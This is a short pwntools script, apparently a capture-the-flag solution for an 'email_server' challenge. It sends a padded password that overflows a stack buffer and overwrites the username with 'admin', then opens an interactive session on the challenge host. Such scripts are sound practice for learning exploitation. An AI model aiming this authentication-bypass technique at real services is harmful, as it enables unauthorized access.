from pwn import *

"""
    password: rbp - 0x30
    username: rbp - 0x50
"""

elf = context.binary = ELF("./dist/email_server", checksec=False)

io = remote("chal.2025.ductf.net", 30000)

password = b"\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3\x00"
# password = "🇦🇩🇲🇮🇳".encode('utf-8')

# print(len(password))

payload = password + b"\x00" * (0x20 - len(password)) + b"admin\x00"

io.sendlineafter(b"username: ", b"A")
io.sendlineafter(b"password: ", payload)

io.interactive()
